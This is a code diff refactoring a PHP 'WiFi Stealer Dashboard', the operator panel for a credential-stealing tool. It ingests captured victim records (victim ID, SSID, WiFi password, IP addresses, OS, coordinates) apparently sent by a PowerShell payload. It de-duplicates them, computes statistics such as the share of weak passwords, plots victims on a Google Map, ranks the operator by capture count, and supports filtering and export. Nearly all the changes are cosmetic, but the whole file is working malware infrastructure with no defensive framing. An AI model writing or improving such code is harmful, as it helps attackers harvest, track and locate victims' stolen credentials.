@@ -6,7 +6,7 @@ $logFile = __DIR__ . '/wifi_creds.log';
 /**
  * Parse a single CSV capture line into a normalized array.
  *
- * CSV order (must match PowerShell payload):
+ * CSV order (must match payload):
  *  0: Timestamp
  *  1: Victim ID
  *  2: SSID
@@ -22,14 +22,10 @@ $logFile = __DIR__ . '/wifi_creds.log';
 function parse_capture_line($line)
 {
     $line = trim($line);
-    if ($line === '') {
-        return null;
-    }
+    if ($line === '') return null;
 
     $fields = str_getcsv($line);
-    if (count($fields) < 5) {
-        return null;
-    }
+    if (count($fields) < 5) return null;
 
     $timeStr     = trim($fields[0] ?? '');
     $victimId    = trim($fields[1] ?? '');
@@ -121,9 +117,8 @@ if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
     $records = [];
     foreach ($rawLines as $rawLine) {
         $entry = parse_capture_line($rawLine);
-        if ($entry === null) {
-            continue;
-        }
+        if ($entry === null) continue;
+
         $records[] = [
             $entry['time_raw'],
             $entry['victim_id'],
@@ -203,9 +198,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'import_csv') {
 if (isset($_POST['action']) && $_POST['action'] === 'clear_all') {
     if (file_exists($logFile)) {
         $handle = fopen($logFile, 'w');
-        if ($handle) {
-            fclose($handle);
-        }
+        if ($handle) fclose($handle);
     }
     header('Location: ' . $_SERVER['PHP_SELF']);
     exit;
@@ -237,18 +230,16 @@ if (file_exists($logFile)) {
     $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 }
 
-// First parse everything
+// Parse all first
 $parsedEntries = [];
 foreach ($rawLines as $idx => $rawLine) {
     $entry = parse_capture_line($rawLine);
-    if ($entry === null) {
-        continue;
-    }
+    if ($entry === null) continue;
     $entry['log_index'] = $idx;
     $parsedEntries[] = $entry;
 }
 
-// Sort by time (newest first)
+// Sort newest first
 usort($parsedEntries, function ($a, $b) {
     $ta = strtotime($a['time_raw']);
     $tb = strtotime($b['time_raw']);
@@ -258,12 +249,12 @@ usort($parsedEntries, function ($a, $b) {
     return $tb <=> $ta;
 });
 
-// Now build a de-duplicated list for everything (table, stats, rank)
+// De-duplicate for everything (table, stats, rank)
 $captureEntries = [];
 $seenKeys = [];
 
 foreach ($parsedEntries as $entry) {
-    // duplicate key definition – change as you like
+    // composite key that defines "same capture"
     $key = $entry['victim_id']
         . '|' . $entry['ssid']
         . '|' . $entry['password']
@@ -272,8 +263,7 @@ foreach ($parsedEntries as $entry) {
         . '|' . $entry['public_ip'];
 
     if (isset($seenKeys[$key])) {
-        // skip duplicates completely
-        continue;
+        continue; // skip duplicate
     }
     $seenKeys[$key] = true;
     $captureEntries[] = $entry;
@@ -285,7 +275,7 @@ foreach ($captureEntries as $i => &$entry) {
 }
 unset($entry);
 
-// --- 7. Stats + unique set for rank ---
+// --- 7. Stats / rank ---
 
 $totalCaptures       = count($captureEntries);
 $ssidCount           = [];
@@ -293,7 +283,6 @@ $ipCount             = [];
 $totalPasswordLength = 0;
 $weakPasswords       = 0;
 
-// For rank: we can reuse the same de-dup logic (captureEntries are already unique)
 foreach ($captureEntries as $entry) {
     if ($entry['ssid'] !== '') {
         $ssidCount[$entry['ssid']] = ($ssidCount[$entry['ssid']] ?? 0) + 1;
@@ -313,7 +302,7 @@ $uniqueIPs       = count($ipCount);
 $avgPasswordLen  = $totalCaptures > 0 ? round($totalPasswordLength / $totalCaptures, 1) : 0;
 $weakPercentage  = $totalCaptures > 0 ? round(($weakPasswords / $totalCaptures) * 100, 1) : 0.0;
 
-$uniqueRankCount = $totalCaptures; // after de-dup, this is already unique count
+$uniqueRankCount = $totalCaptures;
 
 // --- 8. Filters from query ---
 $filter_ssid    = isset($_GET['ssid'])  ? trim($_GET['ssid'])  : '';
@@ -323,27 +312,20 @@ $filter_victim  = isset($_GET['vid'])   ? trim($_GET['vid'])   : '';
 
 $filteredEntries = [];
 foreach ($captureEntries as $entry) {
-    if ($filter_ssid !== '' && stripos($entry['ssid'], $filter_ssid) === false) {
-        continue;
-    }
+    if ($filter_ssid !== '' && stripos($entry['ssid'], $filter_ssid) === false) continue;
     if ($filter_ip !== '' &&
         stripos($entry['ip_main'], $filter_ip) === false &&
-        stripos($entry['public_ip'], $filter_ip) === false) {
-        continue;
-    }
-    if ($filter_os_f !== '' && stripos($entry['os'], $filter_os_f) === false) {
-        continue;
-    }
-    if ($filter_victim !== '' && stripos($entry['victim_id'], $filter_victim) === false) {
-        continue;
-    }
+        stripos($entry['public_ip'], $filter_ip) === false) continue;
+    if ($filter_os_f !== '' && stripos($entry['os'], $filter_os_f) === false) continue;
+    if ($filter_victim !== '' && stripos($entry['victim_id'], $filter_victim) === false) continue;
+
     $filteredEntries[] = $entry;
 }
 
-// --- 9. Map markers + hotspot (for filtered) ---
+// --- 9. Map markers + hotspot (for filtered list) ---
 
 $markers = [];
-$locationBuckets = []; // "lat,lon" => count
+$locationBuckets = [];
 
 foreach ($filteredEntries as $entry) {
     $lat = $entry['latitude'];
@@ -363,7 +345,7 @@ foreach ($filteredEntries as $entry) {
     }
 }
 
-// Hotspot
+// Hotspot label
 $hotspotLabel = 'None';
 if (!empty($locationBuckets)) {
     arsort($locationBuckets);
@@ -372,7 +354,7 @@ if (!empty($locationBuckets)) {
     $hotspotLabel = $topKey . ' (' . $hotspotCount . ' captures)';
 }
 
-// --- 10. Rank based on unique captures ---
+// --- 10. Rank from uniqueRankCount ---
 if ($uniqueRankCount <= 10) {
     $rankName  = 'Rookie';
     $rankPct   = ($uniqueRankCount / 10) * 25;
@@ -388,7 +370,7 @@ if ($uniqueRankCount <= 10) {
 }
 $rankPct = round(min(100, max(5, $rankPct)), 1);
 
-// --- 11. Build JS data for details + map ---
+// --- 11. JS data for details + map ---
 $jsDetails = [];
 foreach ($filteredEntries as $entry) {
     $jsDetails[] = [
@@ -407,7 +389,6 @@ $jsRankPct       = $rankPct;
 $jsHotspotLabel  = $hotspotLabel;
 $jsTotalCaptures = $uniqueRankCount;
 
-$viewMode = 'basic';
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -416,9 +397,9 @@ $viewMode = 'basic';
     <title>WiFi Stealer Dashboard</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
-    <!-- Google Maps JS API: replace YOUR_API_KEY with your key -->
+    <!-- Google Maps JS API: put your key here -->
     <script
-      src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&callback=initCapturesMap"
+      src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY_HERE&callback=initCapturesMap"
       async
       defer
     ></script>
@@ -625,7 +606,6 @@ $viewMode = 'basic';
         window.totalCaptures  = <?php echo json_encode($jsTotalCaptures); ?>;
 
         var mapInstance = null;
-        var mapInitializedOnce = false;
 
         function toggleAutoRefresh(enabled) {
             autoRefresh = enabled;
@@ -696,7 +676,6 @@ $viewMode = 'basic';
             if (!box) return;
             box.style.display = 'block';
 
-            // If Google Maps JS has already initialized the map once, just trigger resize
             if (mapInstance) {
                 google.maps.event.trigger(mapInstance, 'resize');
             }
@@ -707,12 +686,10 @@ $viewMode = 'basic';
             if (box) box.style.display = 'none';
         }
 
-        // This is called by Google Maps JS callback=initCapturesMap
+        // Called by Maps API callback
         function initCapturesMap() {
             var mapDiv = document.getElementById('captures-map');
-            if (!mapDiv) {
-                return;
-            }
+            if (!mapDiv) return;
 
             var markersData = window.captureMarkers || [];
             var defaultLat = 20.5937;
@@ -813,7 +790,7 @@ $viewMode = 'basic';
     <div class="card">
         <form method="get" style="display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin-bottom:4px;">
             <input type="text" name="vid" placeholder="Filter Victim ID"
-                   value="<?php echo h($filter_victim); ?>"
+                   value="<?php echo h($filter_victim ?? ''); ?>"
                    style="padding:4px 8px; font-size:12px; border-radius:6px; border:1px solid #4b5563; background:#020617; color:#e5e7eb;">
             <input type="text" name="ssid" placeholder="Filter SSID"
                    value="<?php echo h($filter_ssid); ?>"
